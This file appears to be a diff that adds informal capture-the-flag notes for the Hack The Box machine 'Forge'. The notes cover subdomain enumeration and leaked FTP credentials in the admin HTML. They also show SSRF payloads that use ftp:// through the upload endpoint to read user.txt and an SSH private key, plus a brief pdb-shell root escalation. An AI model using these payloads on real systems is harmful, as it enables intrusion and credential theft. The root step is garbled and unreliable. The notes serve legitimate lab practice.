@@ -1,0 +1,103 @@
+Looks like we have to enum subdomains?  Also looks like there is a way to upload files based on a URL.  This is probably the exploit
+
+This command: gobuster vhost -w subdomains-top1million-110000.txt -u http://forge.htb -r 
+got the:	 admin.forge.htb 	subdomain
+
+
+Okay, so this url: http%3A%2F%2Fadmin.FoRge.htb%2F
+Got a successful upload, however, there are errors and the image cant be displayed.... Perhaps we can do /index.png or something?  That prob wont work.... but it's progress
+-----
+
+So, using burp to submit the request, we can copy the URL found in the response, then use wget to download that URL.  This is an example response using the URL above:
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Admin Portal</title>
+</head>
+<body>
+    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
+    <header>
+            <nav>
+                <h1 class=""><a href="/">Portal home</a></h1>
+                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
+                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
+            </nav>
+    </header>
+    <br><br><br><br>
+    <br><br><br><br>
+    <center><h1>Welcome Admins!</h1></center>
+</body>
+</html>
+
+I'm starting to see how this is going to work, the announcements mentions that the protocal supports ftp, and gives some creds (see below).  Knowing this, I assume we need to pass an ftp url that uses those creds.
+
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Announcements</title>
+</head>
+<body>
+    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
+    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
+    <header>
+            <nav>
+                <h1 class=""><a href="/">Portal home</a></h1>
+                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
+                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
+            </nav>
+    </header>
+    <br><br><br>
+    <ul>
+        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
+        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
+        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
+    </ul>
+</body>
+</html>    
+
+
+ftp://user:heightofsecurity123!@10.10.11.111/
+
+So this is my thinking:
+Either we need to bypass the upload restrictions that only allow http in order to use ftp
+or
+Pass something like this: 
+http://admin.FoRge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.1.1/user.txt
+
+The above payload worked, I was originally having trouble trying to pass the boxes IP as the server address instead of localhost, 
+and, I added another '/' char after upload (didn't catch this one)
+-------
+So I guess the idea is to assume this is a users home dir?  And to just search for the id_rsa file....
+Maybe we are supposed to assume that "an internal ftp server has been setup with creds as ..." means that a user acc was setup???
+
+http://admin.FoRge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.1.1/.ssh/id_rsa
+
+
+basically to get root, the program you are able to run takes any error and drops you into a pdb shell, in which you can import os, os.system(/root/root.txt)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
